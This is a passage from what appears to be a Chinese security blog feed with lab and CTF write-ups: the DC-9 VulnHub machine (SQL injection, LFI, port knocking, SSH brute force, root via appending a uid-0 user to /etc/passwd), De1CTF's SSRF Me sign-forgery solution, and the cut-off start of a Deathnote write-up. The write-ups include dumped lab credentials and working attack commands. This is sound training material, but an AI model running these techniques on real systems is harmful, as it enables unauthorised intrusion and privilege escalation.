src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514150308.png" /></p>
<p>这里注意，22 端口变成了
filtered，如果此时直接连接，比如输入以下命令： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh root@10.0.2.45</span><br></pre></td></tr></table></figure></p>
<p>会直接报错。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514192237.png" /></p>
<h2 id="网页信息">2.2. 网页信息</h2>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514190917.png" /></p>
<p>依次查看了菜单中的四个功能，Manage是一个登陆界面。Search是一个搜索框。除此之外，没有其他功能点。</p>
<p>首先在 Search 那进行检测，发现输入之后会转到
results.php，抓包测试以下是否存在SQL注入，还真有，为字符型的</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514191236.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514191256.png" /></p>
<p>将其丢入sqlmap中跑，得到两个数据库，将其中重要信息全部保存如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+--------+----------+--------------------------------------------------+</span><br><span class="line">| UserID | Username | Password                                         |</span><br><span class="line">+--------+----------+--------------------------------------------------+</span><br><span class="line">| 1      | admin    | 856f5de590ef37314e7c3bdf6f8a66dc (transorbital1) |</span><br><span class="line">+--------+----------+--------------------------------------------------+</span><br></pre></td></tr></table></figure>
<p>（直接利用sqlmap破解了密码）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+----+-----------+---------------+</span><br><span class="line">| id | username  | password      |</span><br><span class="line">+----+-----------+---------------+</span><br><span class="line">| 1  | marym     | 3kfs86sfd     |</span><br><span class="line">| 2  | julied    | 468sfdfsd2    |</span><br><span class="line">| 3  | fredf     | 4sfd87sfd1    |</span><br><span class="line">| 4  | barneyr   | RocksOff      |</span><br><span class="line">| 5  | tomc      | TC&amp;TheBoyz    |</span><br><span class="line">| 6  | jerrym    | B8m#48sd      |</span><br><span class="line">| 7  | wilmaf    | Pebbles       |</span><br><span class="line">| 8  | bettyr    | BamBam01      |</span><br><span class="line">| 9  | chandlerb | UrAG0D!       |</span><br><span class="line">| 10 | joeyt     | Passw0rd      |</span><br><span class="line">| 11 | rachelg   | yN72#dsd      |</span><br><span class="line">| 12 | rossg     | ILoveRachel   |</span><br><span class="line">| 13 | monicag   | 3248dsds7s    |</span><br><span class="line">| 14 | phoebeb   | smellycats    |</span><br><span class="line">| 15 | scoots    | YR3BVxxxw87   |</span><br><span class="line">| 16 | janitor   | Ilovepeepee   |</span><br><span class="line">| 17 | janitor2  | Hawaii-Five-0 |</span><br><span class="line">+----+-----------+---------------+</span><br></pre></td></tr></table></figure>
<p>尝试之后发现，只有admin能够登录后台</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514191558.png" /></p>
<p>登录后台之后，再次点击
Manage，出现了奇怪的字符，猜测可能存在LFI。虽然不知道参数名，但是一般都是file，filename，path之类的，先尝试一下，实在不行在爆破</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514191632.png" /></p>
<p>确实存在LFI。但是LFI并不能帮助我们get
shell，除非说有日志，但是并不知道drupal的日志在哪。网页也没有命令执行的地方，因此，只能从22端口想办法。</p>
<h1 id="get-shell">3. get shell</h1>
<p>经过搜索如何绕过 "ssh filtered"，发现了这是一个端口保护的机制，叫做
Port Knocking。</p>
<p>简单来说就是默认把ssh上锁，不允许远程连接。并且设置一个端口序列，只有按照该序列访问对应的端口，才能够使
ssh 变成
open。这样子，才能够远程连接。而默认的序列文件的路径为：/etc/knockd.conf。</p>
<p>利用LFI读取其中的内容：（只记录了序列） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// /etc/knockd.conf</span><br><span class="line">sequence: 7469, 8475, 9842</span><br></pre></td></tr></table></figure></p>
<p>然后依次执行下列命令： <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. nmap -p 7469</span><br><span class="line">2. nmap -p 8475</span><br><span class="line">3. nmap -p 9842</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514192323.png" /></p>
<p>然后再次查看22端口的情况，发现变成了open <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -p 22 10.0.2.45</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514192402.png" /></p>
<p>接着利用 hydra
爆破上面所搜集的所有用户名和密码，得到下面三个可以使用的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ssh 爆破</span><br><span class="line">login: chandlerb   password: UrAG0D!</span><br><span class="line">login: joeyt   password: Passw0rd</span><br><span class="line">login: janitor   password: Ilovepeepee</span><br></pre></td></tr></table></figure>
<h1 id="权限提升">4. 权限提升</h1>
<p>随便一个之后进行信息收集，发现既没有suid，也没有sudo，也没有内核，也没有可疑进程，直到看到
janitor 的家目录下的某个文件 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// /home/janitor/passwords-found-on-post-it-notes.txt</span><br><span class="line">BamBam01</span><br><span class="line">Passw0rd</span><br><span class="line">smellycats</span><br><span class="line">P0Lic#10-4</span><br><span class="line">B4-Tru3-001</span><br><span class="line">4uGU5T-NiGHts</span><br></pre></td></tr></table></figure></p>
<p>将这些密码添加到刚刚爆破的密码字典中，再次进行爆破，得到一个新的结果：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">login: fredf   password: B4-Tru3-001</span><br></pre></td></tr></table></figure></p>
<p>登录该用户，发现终于有 sudo -l 了</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514192709.png" /></p>
<p>查看该文件的权限以及内容 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. ls -l /opt/devstuff/dist/test/test</span><br><span class="line">2. strings /opt/devstuff/dist/test/test</span><br></pre></td></tr></table></figure></p>
<p>基本看不懂。直接执行得到帮助信息 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fredf@dc-9:/opt/devstuff/dist/test$ ./test</span><br><span class="line">Usage: python test.py read append</span><br></pre></td></tr></table></figure></p>
<p>但是还是看不懂，并且这个 test.py
就很可疑，猜测这就是编译之前的文件。因此顺着目录往回找，终于在
/opt/devstuff 目录下找到了 test.py 文件，其内容为： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure></p>
<p><strong>说白了就是指定两个文件，会将第一个文件的内容追加到第二个文件中</strong>。</p>
<p>因此，思路就很清晰了，我们可以在 /etc/passwd 中追加一个 “root”
用户就好了。</p>
<p>首先，执行下述命令，创建一个文件，并且写入需要加入到 /etc/passwd
中的内容。 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;hdf:E1s2b9dIx7vPM:0:0:root:/root:/bin/bash&quot; &gt; s.txt</span><br></pre></td></tr></table></figure></p>
<p>（注意，这里的密码可以用 <code>openssl passwd [内容]</code>
生成，如果追加的内容没有密码，则无法登录！）</p>
<p>然后执行下面命令，将内容写入 /etc/passwd <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo /opt/devstuff/dist/test/test s.txt /etc/passwd</span><br></pre></td></tr></table></figure></p>
<p>接着，查看 /etc/passwd 的内容</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514193450.png" /></p>
<p>（红框中的都是我测试的，只有最后一个可以）</p>
<p>最后，切换到 hdf 用户</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220514193554.png" /></p>
<p>收尾工作就是读取flag了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@dc-9:~# cat theflag.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗</span><br><span class="line">████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║</span><br><span class="line">██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║</span><br><span class="line">██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝</span><br><span class="line">██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗</span><br><span class="line">╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝</span><br><span class="line">                                                                             </span><br><span class="line">Congratulations - you have done well to get to this point.</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those</span><br><span class="line">who have taken the time to complete the various DC challenges.</span><br><span class="line"></span><br><span class="line">I also want to send out a big thank you to the various members of @m0tl3ycr3w .</span><br><span class="line"></span><br><span class="line">They are an inspirational bunch of fellows.</span><br><span class="line"></span><br><span class="line">Sure, they might smell a bit, but...just kidding.  :-)</span><br><span class="line"></span><br><span class="line">Sadly, all things must come to an end, and this will be the last ever</span><br><span class="line">challenge in the DC series.</span><br><span class="line"></span><br><span class="line">So long, and thanks for all the fish.</span><br></pre></td></tr></table></figure>
<h1 id="总结">5. 总结</h1>
<p>该靶机对于我来说比较简单，还让我学到了一个新的知识。涉及的攻击方法有：</p>
<ol type="1">
<li>SQL注入</li>
<li>文件包含</li>
<li>Port Knocking</li>
<li>密码爆破</li>
<li>sudo提权</li>
</ol>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>综合</tag>
        <tag>vulnhub</tag>
        <tag>SQL注入</tag>
        <tag>sudo提权</tag>
        <tag>文件包含</tag>
        <tag>密码爆破</tag>
        <tag>Prot Knocking</tag>
      </tags>
  </entry>
  <entry>
    <title>De1CTF 2019 SSRF Me</title>
    <url>/2022/04/11/De1CTF%202019%20SSRF%20Me/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BDe1CTF%202019%5DSSRF%20Me">SSRF_ME</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，看到一串代码，将代码整理一下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, action, param, sign, ip</span>):</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):    <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                    result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">                result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line">    </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span>(<span class="params">action, param</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<p>进入环境之前还有一个小提示。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag is in ./flag.txt</span><br></pre></td></tr></table></figure></p>
<h1 id="解题">解题</h1>
<p>先从路由看起： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span>():</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure></p>
<p>当访问<code>ip/geneSign</code>时，param以GET方式传入，然后将<code>action=scan</code>，最后调用<code>getSign(action, param)</code>。而该函数返回一个md5加密得字符串。</p>
<p>再查看下一个路由： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/De1ta&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br></pre></td></tr></table></figure></p>
<p>当访问<code>ip/De1ta</code>时，GET传入param，cookie传入action和sign，然后执行<code>waf(param)</code>，该函数判断param参数（经过处理后）是否以<code>gopher</code>和<code>file</code>开头，也就是不能使用这两个协议进行文件读取。</p>
<p>如果<code>waf(param)</code>函数返回<code>False</code>，则创建一个<code>Task</code>对象，然后执行<code>task.Exec()</code>：
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exec</span>(<span class="params">self</span>):</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">    <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;scan&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            tmpfile = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">            resp = scan(self.param)</span><br><span class="line">            <span class="keyword">if</span> (resp == <span class="string">&quot;Connection Timeout&quot;</span>):</span><br><span class="line">                result[<span class="string">&#x27;data&#x27;</span>] = resp</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> resp</span><br><span class="line">                tmpfile.write(resp)</span><br><span class="line">                tmpfile.close()</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;read&quot;</span> <span class="keyword">in</span> self.action:</span><br><span class="line">            f = <span class="built_in">open</span>(<span class="string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">200</span></span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">&#x27;code&#x27;</span>] == <span class="number">500</span>:</span><br><span class="line">            result[<span class="string">&#x27;data&#x27;</span>] = <span class="string">&quot;Action Error&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result[<span class="string">&#x27;code&#x27;</span>] = <span class="number">500</span></span><br><span class="line">        result[<span class="string">&#x27;msg&#x27;</span>] = <span class="string">&quot;Sign Error&quot;</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure></p>
<p>会首先检查<code>self.checkSign()</code> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSign</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure></p>
<p>只有满足<code>getSign(self.action, self.param) == self.sign</code>才可以继续执行，这里是一个要解决的点。</p>
<p>假设我们满足上述情况了，接下来先判断<code>if "scan" in self.action</code>，如果满足，则会执行<code>resp = scan(self.param)</code>：
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span>(<span class="params">param</span>):</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Connection Timeout&quot;</span></span><br></pre></td></tr></table></figure></p>
<p>该函数会去访问<code>param</code>并且读取其中得内容并返回。<strong>猜想：利用这个读取flag.txt中得内容</strong>。如果<code>param</code>的确有内容，那么返回到<code>Exec()</code>，然后执行<code>tmpfile.write(resp)</code>，也就是将读取得内容写到<code>./%s/result.txt</code>。</p>
<p>如果满足<code>if "read" in self.action</code>，则会读取<code>./%s/result.txt</code>中的内容，然后通过<code>result</code>返回。</p>
<p>最后执行<code>return json.dumps(task.Exec())</code>，将<code>Exec()</code>中的内容以json格式打印出来。</p>
<p>思路：通过对代码的分析，有了初步思路：</p>
<ol type="1">
<li>先将flag.txt中的内容写到<code>./%s/result.txt</code>中，也就是action中得有字符串scan；</li>
<li>然后读取<code>./%s/result.txt</code>中的内容，成功读取到flag，也就是action中也要有字符串read；</li>
</ol>
<p>难题：</p>
<ul>
<li>如何满足<code>self.checkSign()</code>，也就是<code>getSign(self.action, self.param) == self.sign</code></li>
</ul>
<p>可以利用<code>/geneSign?param=flag.txt</code>，但是这样子得到的是<code>getSign(scan, flag.txt)</code>的值，我们不仅需要<code>scan</code>还需要<code>read</code>。</p>
<p>注意 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hashlib.md5(secert_key + param + action).hexdigest()</span><br></pre></td></tr></table></figure></p>
<p>分析： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">param=flag.txtread, action=scan</span><br><span class="line">secert_key + param + action = secert_key + flag.txtreadscan</span><br></pre></td></tr></table></figure></p>
<p>也就是我们先用<code>/geneSign?param=flag.txtread</code>得到<code>secert_key + flag.txtreadscan</code>的MD5值，将其作为<code>sign</code>。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411114816.png" /></p>
<p>然后我们访问<code>/De1ta?param=flag.txt</code>，然后cookie中<code>Cookie: sign=83f8669fd768b006207e62cf66f61904;action=readscan</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220411114844.png" /></p>
<p>成功读取flag！</p>
<p>这是因为此时的<code>sign</code>其实是<code>hashlib.md5(secert_key + flag.txtread + scan).hexdigest()</code>。而执行<code>self.checkSign()</code>时<code>getSign(self.action, self.param) -&gt; hashlib.md5(secert_key + flag.txt + readscan).hexdigest()</code>，自然就满足了<code>getSign(self.action, self.param) == self.sign</code>。并且action中<code>read</code>和<code>scan</code>都有，也就是先将flag.txt内容写入<code>./%s/result.txt</code>，然后在读取该文件中的内容，从而得到了flag。</p>
<h1 id="总结">总结</h1>
<p>本题对于SSRF的考察就在于<code>urllib.urlopen(param).read()[:50]</code>，利用这读取flag文件的内容。</p>
<p>本题主要考察的其实是代码审计的能力！</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
        <tag>python</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>Deathnote Writeup</title>
    <url>/2022/05/20/Deathnote%20Writeup/</url>
    <content><![CDATA[<p>靶机难度不高。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/deathnote-1,739/">Deathnote:
1 ~ VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>简单</li>
</ul>
<p>目标：</p>
<ul>
<li>拿到root权限</li>
<li>拿到2个flag</li>
</ul>
<h1 id="信息收集">2. 信息收集</h1>
<h2 id="端口信息">2.1. 端口信息</h2>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.53</span><br><span class="line">3. sudo nmap -p22,80 -A 10.0.2.53</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220520150335.png" /></p>
<h2 id="网页信息">2.2. 网页信息</h2>
<p>直接访问10.0.2.53，发现跳转到了
deathnote.vuln，因此将该域名加入/etc/hosts。其实不加也没事，经过后面的测试发现不能直接访问10.0.2.53，但是能够访问目录下的文件，比如10.0.2.53/robots.txt，内容如下：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fuck it my dad </span><br><span class="line">added hint on /important.jpg</span><br><span class="line"></span><br><span class="line">ryuk please delete it</span><br></pre></td></tr></table></figure></p>
<p>直接在浏览器无法查看该文件，提示图片有误，使用curl访问：
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl http://10.0.2.53/important.jpg</span><br></pre></td></tr></table></figure></p>
